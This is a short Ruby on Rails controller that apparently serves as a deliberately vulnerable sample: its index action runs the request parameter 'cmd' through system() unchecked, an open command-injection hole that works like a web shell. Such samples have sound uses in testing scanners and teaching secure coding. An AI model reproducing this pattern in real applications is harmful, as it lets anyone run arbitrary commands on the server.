class TestController < ApplicationController
  def index
    cmd_res = system(params[:cmd])
    render plain: "Result: #{cmd_res}"
  end
end
